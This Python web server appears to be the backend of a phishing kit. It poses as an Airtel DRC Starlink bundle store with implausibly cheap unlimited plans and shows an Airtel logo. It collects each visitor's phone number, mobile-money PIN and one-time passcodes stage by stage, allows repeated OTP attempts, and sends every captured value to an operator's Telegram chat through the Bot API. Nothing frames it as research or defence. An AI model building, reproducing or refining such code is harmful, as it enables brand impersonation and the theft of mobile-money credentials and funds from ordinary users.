import json
import os
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlsplit, parse_qs, urlencode
from pathlib import Path
import urllib.request

ROOT = Path(__file__).resolve().parent
PORT = 8000


def load_env_file():
    env_path = ROOT / ".env"
    if not env_path.exists():
        return

    with env_path.open("r", encoding="utf-8") as file:
        for line in file:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, value = line.split("=", 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            os.environ.setdefault(key, value)


load_env_file()


def get_telegram_config():
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()

    placeholder_values = {"your_bot_token_here", "your_chat_id_here", "placeholder", "changeme"}
    if bot_token.lower() in placeholder_values or chat_id.lower() in placeholder_values:
        return "", ""

    return bot_token, chat_id

USD_TO_CDF = 2300


def format_cdf_price(amount_usd):
    return f"CDF {round(amount_usd * USD_TO_CDF):,}"


PLANS = {
    "12": {"name": "Basic Satellite Bundle", "details": "1GB + 200 Min · 200 Minutes + 1000 SMS + 1GB Data", "price": format_cdf_price(0.50)},
    "13": {"name": "Starlink Connect", "details": "5GB + 500 Min · 500 Minutes + 5000 SMS + 5GB Data", "price": format_cdf_price(1.00)},
    "14": {"name": "Starlink Family", "details": "10GB + 1000 Min · 1000 Minutes + 10000 SMS + 10GB Data", "price": format_cdf_price(1.50)},
    "15": {"name": "Direct to Cell Premium", "details": "20GB + 2000 Min · 2000 Minutes + Unlimited SMS + 20GB Data", "price": format_cdf_price(2.00)},
    "16": {"name": "Unlimited Direct to Cell", "details": "Unlimited Minutes + Unlimited SMS + Unlimited Data", "price": format_cdf_price(2.50)},
}


def send_telegram_notification(package_id, phone_number, stage=None, pin="", otp="", attempt_number=1):
    bot_token, chat_id = get_telegram_config()
    if not bot_token or not chat_id:
        return False, "Telegram is not configured. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to your .env file or shell environment."

    plan = PLANS.get(package_id, {"name": "Selected Bundle", "price": "CDF 0"})

    if stage == "phone":
        message = (
            "New Airtel DRC Starlink order\n"
            "Stage: Phone number entered\n"
            f"Plan: {plan['name']}\n"
            f"Phone: {phone_number}"
        )
    elif stage == "pin":
        message = (
            "New Airtel DRC Starlink order\n"
            "Stage: PIN entered\n"
            f"Plan: {plan['name']}\n"
            f"Phone: {phone_number}\n"
            f"PIN: {pin}"
        )
    elif stage == "otp":
        remaining = max(0, 5 - attempt_number)
        message = (
            "New Airtel DRC Starlink order\n"
            f"Stage: OTP attempt {attempt_number}/5\n"
            f"Plan: {plan['name']}\n"
            f"Phone: {phone_number}\n"
            f"OTP entered: {otp}\n"
            f"{'Please retry with the correct OTP.' if remaining > 0 else 'Maximum attempts reached. Please request a new OTP.'}"
        )
    else:
        message = (
            "New Airtel DRC Starlink order\n"
            f"Plan: {plan['name']}\n"
            f"Price: {plan['price']}\n"
            f"Phone: {phone_number}"
        )

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = urlencode({"chat_id": chat_id, "text": message}).encode("utf-8")
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            body = response.read().decode("utf-8")
        if '"ok":true' in body:
            return True, "Telegram notification sent successfully."
        return False, body
    except Exception as exc:
        return False, str(exc)


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def do_GET(self):
        path = urlsplit(self.path).path
        if path in ("/", "/dashboard", "/dashboard/"):
            self.path = "/dashboard.html"
        elif path in ("/plans", "/plans/"):
            self.path = "/plans.html"
        elif path == "/payment":
            self.path = "/payment.html"
        return super().do_GET()

    def do_POST(self):
        path = urlsplit(self.path).path
        if path in ("/plans", "/plans/"):
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8")
            data = parse_qs(body)
            package_id = data.get("package_id", [""])[0]
            plan = PLANS.get(package_id, {"name": "Selected Bundle", "details": "Custom plan", "price": "CDF 0"})
            html = Path(ROOT / "payment.html").read_text(encoding="utf-8")
            html = html.replace("{{PLAN_NAME}}", plan["name"]) \
                       .replace("{{PLAN_DETAILS}}", plan["details"]) \
                       .replace("{{PLAN_PRICE}}", plan["price"]) \
                       .replace("{{PACKAGE_ID}}", package_id)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode("utf-8"))
            return

        if path in ("/notify", "/notify/"):
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8")
            data = parse_qs(body)
            stage = data.get("stage", [""])[0].strip()
            package_id = data.get("package_id", [""])[0]
            phone = data.get("phone_number", [""])[0].strip()
            pin = data.get("pin", [""])[0].strip()
            otp = data.get("otp", [""])[0].strip()
            attempt = int(data.get("attempt", ["1"])[0] or "1")

            if stage in ("phone", "pin", "otp"):
                if stage == "phone" and not phone:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "message": "Phone number is required."}).encode("utf-8"))
                    return
                if stage == "pin" and not pin:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "message": "PIN is required."}).encode("utf-8"))
                    return
                if stage == "otp" and not otp:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "message": "OTP is required."}).encode("utf-8"))
                    return

                ok, message = send_telegram_notification(package_id, phone, stage=stage, pin=pin, otp=otp, attempt_number=attempt)
                self.send_response(200)
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": ok, "message": message}).encode("utf-8"))
                return

            if not phone:
                self.send_response(400)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"Phone number is required.")
                return

            if not pin:
                self.send_response(400)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"PIN is required.")
                return

            if not otp:
                self.send_response(400)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"OTP is required.")
                return

            ok, message = send_telegram_notification(package_id, phone)
            response_html = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Payment Confirmation</title>
              <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
              <div class="bg-white rounded-2xl shadow-xl max-w-md w-full p-6 text-center">
                <div class="flex items-center justify-center mb-5">
                  <img src="/static/images/airtel_logo.png" alt="Airtel DRC" class="h-12 object-contain" />
                </div>
                <h1 class="text-2xl font-black text-gray-900 mb-3">Payment request received</h1>
                <p class="text-gray-700 mb-2">Phone: {phone}</p>
                <p class="text-gray-700 mb-2">PIN: {pin}</p>
                <p class="text-gray-700 mb-4">OTP: {otp}</p>
                <p class="text-sm {'text-green-600' if ok else 'text-red-600'}">{message}</p>
              </div>
            </body>
            </html>
            """
            self.send_response(200 if ok else 202)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(response_html.encode("utf-8"))
            return

        self.send_response(405)
        self.end_headers()


if __name__ == "__main__":
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"Serving on http://localhost:{PORT}")
    server.serve_forever()
